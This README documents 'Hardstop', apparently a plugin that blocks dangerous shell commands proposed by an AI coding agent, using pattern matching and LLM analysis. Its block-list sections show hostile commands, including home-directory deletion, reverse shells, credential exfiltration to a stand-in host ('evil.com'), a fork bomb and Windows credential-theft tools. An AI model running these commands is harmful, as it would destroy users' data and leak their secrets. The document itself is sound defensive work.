# 🛑 Hardstop

**Version:** 1.0.0 | **License:** CC BY 4.0 | **Author:** Francesco Marinoni Moretto

> **Commands:** `/hs`, `/hardstop`, `/hard` — Enable/disable/skip safety checks  
> **Hook:** PreToolUse — Blocks dangerous Bash/PowerShell commands using pattern matching + LLM analysis

The mechanical brake for AI-generated commands. Hard backstop that catches dangerous commands even when soft guardrails fail.

## Quick Examples

```bash
# Claude tries to run a dangerous command
$ rm -rf ~/
🛑 BLOCKED: Deletes home directory

# Check protection status
/hs status
Hardstop v1.0.0
  Status:      🟢 Enabled
  Skip next:   No
  Fail mode:   Fail-closed

# One-time bypass for a command you trust
/hs skip
⏭️  Next command will skip safety check

# View recent security decisions  
/hs log
2025-01-15 10:30:45 🛑 [pattern] rm -rf ~/
                     └─ Deletes home directory
2025-01-15 10:31:02 ✅ [pattern] git status
```

### What Gets Blocked

```bash
# Home directory deletion
rm -rf ~/                    # 🛑 BLOCKED
rm -rf $HOME                 # 🛑 BLOCKED

# Reverse shells
bash -i >& /dev/tcp/...     # 🛑 BLOCKED
nc -e /bin/sh ...           # 🛑 BLOCKED

# Credential exfiltration  
curl -d @~/.ssh/id_rsa ...  # 🛑 BLOCKED
tar czf - ~/.aws | nc ...   # 🛑 BLOCKED

# Pipe-to-shell attacks
curl http://evil.com | bash # 🛑 BLOCKED

# Windows attacks
rd /s /q C:\Users           # 🛑 BLOCKED
powershell -e <base64>      # 🛑 BLOCKED
reg delete HKLM\...         # 🛑 BLOCKED
```

### What Gets Allowed

```bash
# Safe read-only operations
ls -la                       # ✅ ALLOWED
cat README.md                # ✅ ALLOWED
git status                   # ✅ ALLOWED
git log --oneline            # ✅ ALLOWED

# Regeneratable cleanup
rm -rf node_modules          # ✅ ALLOWED
rm -rf __pycache__           # ✅ ALLOWED
rm -rf .venv                 # ✅ ALLOWED

# Windows safe operations
dir                          # ✅ ALLOWED
Get-ChildItem                # ✅ ALLOWED
type README.md               # ✅ ALLOWED
```

## Design Principles

### Fail-Closed
If the safety check cannot complete (CLI unavailable, timeout, parse error), the command is **blocked**, not allowed. This ensures broken installations don't silently permit dangerous operations.

### Defense in Depth
Two-layer verification:
1. **Pattern matching** — Instant regex-based detection of known dangerous patterns
2. **LLM analysis** — Semantic analysis for edge cases and novel threats

### Command Chaining Awareness
Analyzes all parts of piped and chained commands (`&&`, `||`, `;`, `|`). A chain is dangerous if ANY part is dangerous.

## How It Works

```
Command arrives
      ↓
┌─────────────────────────────┐
│  Layer 1: Pattern Match     │  ← Instant (regex)
│  DANGEROUS? → BLOCK         │
│  ALL SAFE? → ALLOW          │
│  Unknown? → Continue        │
└─────────────────────────────┘
      ↓
┌─────────────────────────────┐
│  Layer 2: Claude Analysis   │  ← Within subscription
│  claude --print --model     │
│  → ALLOW / BLOCK            │
└─────────────────────────────┘
      ↓
   Execute or Block
      ↓
   Log decision to audit.log
```

## Installation

### macOS/Linux

```bash
# Clone and install
git clone https://github.com/frmoretto/hardstop.git
cd hardstop
./install.sh
```

Or manually:

```bash
git clone https://github.com/frmoretto/hardstop.git
mkdir -p ~/.claude/plugins
cp -r hardstop ~/.claude/plugins/
```

### Windows

```powershell
# Clone and install
git clone https://github.com/frmoretto/hardstop.git
cd hardstop
powershell -ExecutionPolicy Bypass -File install.ps1
```

Or manually:

```powershell
git clone https://github.com/frmoretto/hardstop.git
Copy-Item -Path .\hardstop\* -Destination "$env:USERPROFILE\.claude\plugins\hardstop" -Recurse -Force -Exclude '.venv','.git'
```

### Verify

Restart Claude Code, then:

```
/hs help
```

## Commands

| Command | Purpose |
|---------|---------|
| `/hs on` | Enable protection (default) |
| `/hs off` | Disable temporarily |
| `/hs skip` | Skip next command only |
| `/hs status` | Show state and stats |
| `/hs log` | Show recent audit entries |
| `/hs help` | Show commands |

Aliases: `/hardstop`, `/hard`, `/hs`

## What It Catches

### Unix (macOS/Linux) — Pattern Matching

- **Home/root deletion** — `rm -rf ~/`, `rm -rf /`, `rm -rf $HOME`
- **Fork bombs** — `:(){ :|:& };:`
- **Reverse shells** — `/dev/tcp`, `nc -e`, Python/Perl variants
- **Credential exfiltration** — curl/wget POST with `.ssh`, `.aws`, `.config`
- **Disk destruction** — `dd of=/dev/sd*`, `mkfs`, `shred`
- **Encoded payloads** — base64-decoded shell execution
- **Pipe-to-shell** — `curl ... | bash`, `wget ... | sh`
- **System damage** — `chmod 777 /`, recursive permission changes
- **Dangerous sudo** — `sudo rm -rf /`, `sudo dd`

### Windows — Pattern Matching

- **System deletion** — `rd /s /q C:\`, `del /f C:\Windows`, `Remove-Item -Recurse`
- **Registry manipulation** — `reg delete HKLM`, registry Run keys (persistence)
- **Credential theft** — `mimikatz`, `cmdkey /list`, SAM database access
- **Disk/boot destruction** — `format C:`, `diskpart`, `bcdedit /delete`
- **Security disabling** — Firewall off, Defender disabled, execution policy bypass
- **Download cradles** — PowerShell IEX, certutil, bitsadmin, mshta
- **Encoded payloads** — `powershell -e <base64>`
- **Privilege escalation** — `net user /add`, `net localgroup administrators`
- **Persistence** — `schtasks /create`, registry Run keys

### LLM Analysis (Layer 2)

- Obfuscated commands
- Novel attack patterns
- Context-dependent risks
- Anything patterns miss

## Audit Logging

All decisions are logged to `~/.hardstop/audit.log` in JSON-lines format:

```json
{"timestamp": "2025-01-15T10:30:45", "version": "1.0.0", "command": "rm -rf ~/", "cwd": "/home/user", "verdict": "BLOCK", "reason": "Deletes home directory", "layer": "pattern"}
```

View recent entries with `/hs log`.

## Files

```
hardstop/
├── .claude-plugin/
│   └── plugin.json
├── hooks/
│   ├── hooks.json
│   └── pre_tool_use.py
├── commands/
│   └── hs_cmd.py
├── tests/
│   ├── __init__.py
│   └── test_hook.py
├── install.sh           # macOS/Linux installer
├── install.ps1          # Windows installer
├── requirements-dev.txt
├── LICENSE              # CC BY 4.0
├── PRIVACY.md           # Privacy policy
├── SECURITY.md          # Security policy
└── README.md
```

## Testing

```bash
# Install test dependencies
python -m pip install -r requirements-dev.txt

# Run all tests
python -m pytest tests/ -v

# Or without pytest
python tests/test_hook.py
```

## Development

```bash
python -m pip install -r requirements-dev.txt
python -m pytest tests/ -v
```

**Test coverage:**
- Command chaining (10 tests)
- Unix dangerous pattern detection (12 tests)
- Windows dangerous pattern detection (18 tests)
- Unix safe pattern detection (10 tests)
- Windows safe pattern detection (9 tests)
- Chained command analysis (4 tests)
- State management (4 tests)
- LLM response parsing (7 tests)
- Audit logging (3 tests)
- Hook integration via subprocess (5 tests)
- Slash command interface (6 tests)

## State Files

- `~/.hardstop/state.json` — Enabled/disabled state
- `~/.hardstop/skip_next` — One-time bypass flag (created by `/hs skip`, consumed atomically)
- `~/.hardstop/audit.log` — Decision audit log

## Limitations

1. **Pattern evasion** — Sophisticated obfuscation may bypass regex patterns
2. **LLM dependency** — Layer 2 requires Claude CLI and API access
3. **No confirmation flow** — Binary ALLOW/BLOCK only (no "explain + confirm")

## Standalone

This plugin works independently. No skill required.

## Changelog

### v1.0.0
First public release.

**Core Features:**
- **Two-layer defense** — Pattern matching (instant) + LLM analysis (semantic)
- **Fail-closed design** — If safety check fails, command is blocked (not allowed)
- **Cross-platform** — Unix (Bash) + Windows (PowerShell) pattern detection
- **Command chaining** — Analyzes all parts of piped/chained commands (`&&`, `||`, `;`, `|`)
- **Audit logging** — All decisions logged to `~/.hardstop/audit.log`

**Pattern Coverage:**
- Home/root deletion, fork bombs, reverse shells
- Credential exfiltration (`.ssh`, `.aws`, `.config`)
- Disk destruction, encoded payloads, pipe-to-shell
- Windows: Registry manipulation, LOLBins, PowerShell download cradles

**Reliability:**
- Atomic state writes (prevents corruption)
- Atomic skip flag (prevents race conditions)
- Windows CLI detection (`claude.cmd` via `cmd /c`)
- Full-command matching for safe patterns (prevents substring bypass)

## License

CC BY 4.0
